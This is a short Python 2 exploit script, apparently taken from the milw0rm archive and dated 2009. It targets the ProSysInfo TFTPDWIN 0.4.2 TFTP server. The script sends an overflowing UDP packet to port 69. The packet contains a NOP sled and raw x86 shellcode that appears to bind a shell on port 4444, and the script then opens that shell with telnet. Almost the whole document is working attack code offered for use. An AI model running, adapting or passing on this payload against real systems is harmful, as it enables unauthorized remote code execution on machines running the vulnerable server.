#!/usr/bin/python

#ProSysInfo TFTP Server TFTPDWIN 0.4.2
#Coded by Wraith

import os
import sys
import struct
import socket
import time


print "\nProSysInfo TFTP Server TFTPDWIN 0.4.2"
print "Note: This vuln is sensitive to different buffer length\n"
 
if len(sys.argv)!=2:
        print "Usage: tftpdwin.py <ip>"
        sys.exit(0)


	
buffer = "\x00\x01\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
buffer += "\x8b\xc3\x66\x05\x12\x01\x50\xc3" + "\x90"*57

buffer += "\x59\x81\xc9\xd3\x62\x30\x20\x41\x43\x4d\x64"
buffer += "\x64\x99\x96\x8D\x7E\xE8\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B\x49\x1C"
buffer += "\x8B\x09\x8B\x69\x08\xB6\x03\x2B\xE2\x66\xBA\x33\x32\x52\x68\x77"
buffer += "\x73\x32\x5F\x54\xAC\x3C\xD3\x75\x06\x95\xFF\x57\xF4\x95\x57\x60"
buffer += "\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59\x20\x03\xDD\x33\xFF"
buffer += "\x47\x8B\x34\xBB\x03\xF5\x99\xAC\x34\x71\x2A\xD0\x3C\x71\x75\xF7"
buffer += "\x3A\x54\x24\x1C\x75\xEA\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B"
buffer += "\x59\x1C\x03\xDD\x03\x2C\xBB\x95\x5F\xAB\x57\x61\x3B\xF7\x75\xB4"
buffer += "\x5E\x54\x6A\x02\xAD\xFF\xD0\x88\x46\x13\x8D\x48\x30\x8B\xFC\xF3"
buffer += "\xAB\x40\x50\x40\x50\xAD\xFF\xD0\x95\xB8\x02\xFF\x11\x5c\x32\xE4"
buffer += "\x50\x54\x55\xAD\xFF\xD0\x85\xC0\x74\xF8\xFE\x44\x24\x2D\xFE\x44"
buffer += "\x24\x2c\x83\xEF\x6C\xAB\xAB\xAB\x58\x54\x54\x50\x50\x50\x54\x50"
buffer += "\x50\x56\x50\xFF\x56\xE4\xFF\x56\xE8\x90\x90\x90\x90\x90\x90\x90"
buffer += "\x42\xfb\x61\x40\x00\x6e\x65\x74\x61\x73\x63\x69\x69\x00"


target = sys.argv[1]
def Connect(target):
	connect = "telnet " + target + " 4444"
	os.system(connect)
	
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

try:
	s.sendto(buffer, (target,69))
	print "[*] Initiating Buffer Overflow"
	time.sleep(2)
	print "[*] Attempting Connection to Remote Host"
	time.sleep(2)
	print "[*] Please Wait...\n"
	time.sleep(3)
	Connect(target)
	print "\nClosing Remote Connection\n"
	sys.exit(0)
except:
	print "Goodbye\n"	

# milw0rm.com [2009-08-18]
